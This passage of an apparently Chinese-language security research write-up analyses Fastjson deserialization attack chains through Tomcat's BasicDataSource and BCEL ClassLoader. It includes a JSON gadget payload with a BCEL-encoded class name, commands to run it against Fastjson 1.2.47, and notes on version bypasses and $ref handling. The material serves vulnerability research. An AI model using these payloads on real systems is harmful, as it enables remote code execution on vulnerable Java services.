+ * 416行，1.2.33此处是
+ *
+ * key = (key == null) ? "null" : key.toString()
+ *
+ * 1.2.37删除了
+ *
+ * key.toString()
+ */
+            if (object.getClass() == JSONObject.class) {
+                if (key == null) {
+                    key = "null";
+                }
+            }
+--------------------------------------------------------------------------
+
+我看1.2.68代码时注意到此间变化，但没有回溯调研，如今看来就是1.2.37开始的；
+这个变化使得相应攻击技巧失效。
+
+14) Fastjson_BasicDataSource8.json (36~47可利用)
+
+把Fastjson_BasicDataSource_bad_2.json、Fastjson_BasicDataSource5.json结合
+一下，形成Fastjson_BasicDataSource8.json。
+
+1.2.36才开始支持$ref这种技巧。
+
+--------------------------------------------------------------------------
+{
+    'a':
+    {
+        '@type':"java.lang.Class",
+        'val':'org.apache.tomcat.dbcp.dbcp.BasicDataSource'
+    },
+    'b':
+    {
+        '@type':"java.lang.Class",
+        'val':'com.sun.org.apache.bcel.internal.util.ClassLoader'
+    },
+    'c':
+    {
+        '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+        'driverClassLoader':
+        {
+            '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
+        },
+        'driverClassName':'$$BCEL$$$l$8b...$A$A',
+        '$ref':'$.c.connection'
+    }
+}
+--------------------------------------------------------------------------
+
+java \
+-cp "fastjson-1.2.47.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize Fastjson_BasicDataSource8.json
+
+java \
+-cp "fastjson-1.2.47.jar:tomcat-dbcp-7.0.99.jar:." \
+FastjsonDeserialize2 Fastjson_BasicDataSource8.json
+
+ls -l /tmp/scz_is_here
+
+不会抛异常，直接成功。
+
+☆ 小结
+
+BasicDataSource攻击链只能用于Fastjson 1.2.24及更低版本。
+
+曾经用于JdbcRowSetImpl攻击链的1.2.25至1.2.47的所有补丁绕过方案均无法用于
+BasicDataSource攻击链，各有原因。
+
+java.lang.Class.forName()有机会执行目标类静态代码块，jdb中可拦截some.<clinit>。
+
+java.lang.ClassLoader.defineClass()并不会执行目标类静态代码块。
+
+Class.forName0()中执行静态代码块时并不是通过ClassLoader.defineClass()触发
+的，native方法中另有触发点，触发点位于对defineClass()调用之后的某处。
+
+com.sun.org.apache.bcel.internal.util.ClassLoader加载class时对类名有特殊流
+程，如果类名中包含"$$BCEL$$"子串，则判定此类名中还包含经BCEL编码过的类的字
+节码。此时util.ClassLoader会从特殊类名中解码还原出类的字节码并加载之，这个
+操作太邪恶。这是整个攻击过程中最有意思的部分，或许在别处用得上。
+
+就BasicDataSource攻击链而言，可以不用静态代码块执行恶意代码，后面另有机会
+调用恶意类的无参构造函数，jdb中可拦截some.<init>。
+
+"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"亦可用于攻击。
+
+☆ 近几年为安全工程师不会饿死做出突出贡献的几个东西
+
+a. Struts2
+b. ThinkPhp
+c. (完形填空)
+
+作为正经程序员，我跨界瞎猜了一个WebLogic，然后题主告诉我标准答案是Fastjson。
+
+☆ 参考资源
+
+[32]
+    https://github.com/alibaba/fastjson
+
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.14/fastjson-1.2.14.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.25/fastjson-1.2.25.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.25/fastjson-1.2.25-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.33/fastjson-1.2.33.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.33/fastjson-1.2.33-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.36/fastjson-1.2.36.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.37/fastjson-1.2.37.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.37/fastjson-1.2.37-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.41/fastjson-1.2.41.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.42/fastjson-1.2.42.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.42/fastjson-1.2.42-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.43/fastjson-1.2.43.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.43/fastjson-1.2.43-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.45/fastjson-1.2.45.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.45/fastjson-1.2.45-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/fastjson-1.2.47.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.47/fastjson-1.2.47-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48/fastjson-1.2.48.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.48/fastjson-1.2.48-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.50/fastjson-1.2.50.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.51/fastjson-1.2.51.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.51/fastjson-1.2.51-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.59/fastjson-1.2.59.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.59/fastjson-1.2.59-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.60/fastjson-1.2.60.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.60/fastjson-1.2.60-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.61/fastjson-1.2.61.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.62/fastjson-1.2.62.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.66/fastjson-1.2.66.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.67/fastjson-1.2.67.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.67/fastjson-1.2.67-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.68/fastjson-1.2.68.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.68/fastjson-1.2.68-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.69/fastjson-1.2.69.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.69/fastjson-1.2.69-sources.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.70/fastjson-1.2.70.jar
+    https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.70/fastjson-1.2.70-sources.jar
+
+    JSONPath
+    https://github.com/alibaba/fastjson/wiki/JSONPath
+
+[33]
+    FastJson反序列化漏洞利用的三个细节TemplatesImpl利用链 - KINGX [2018-07-06]
+    https://kingx.me/Details-in-FastJson-RCE.html
+    https://mp.weixin.qq.com/s/C1Eo9wst9vAvF1jvoteFoA
+    https://paper.seebug.org/636/
+
+[73]
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-dbcp/7.0.99/
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-dbcp/7.0.99/tomcat-dbcp-7.0.99.jar
+
+    https://repo1.maven.org/maven2/org/apache/tomcat/dbcp/6.0.53/
+    https://repo1.maven.org/maven2/org/apache/tomcat/dbcp/6.0.53/dbcp-6.0.53.jar
+
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-dbcp/9.0.20/
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-dbcp/9.0.20/tomcat-dbcp-9.0.20.jar
+
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-juli/9.0.20/
+    https://repo1.maven.org/maven2/org/apache/tomcat/tomcat-juli/9.0.20/tomcat-juli-9.0.20.jar
+
+[76]
+    Java动态类加载 当FastJson遇到内网 - KINGX [2019-12-31]
+    https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
+
+[77]
+    浅谈fastjson反序列化漏洞 - [2020-04-13]
+    http://blog.0kami.cn/2020/04/13/talk-about-fastjson-deserialization/
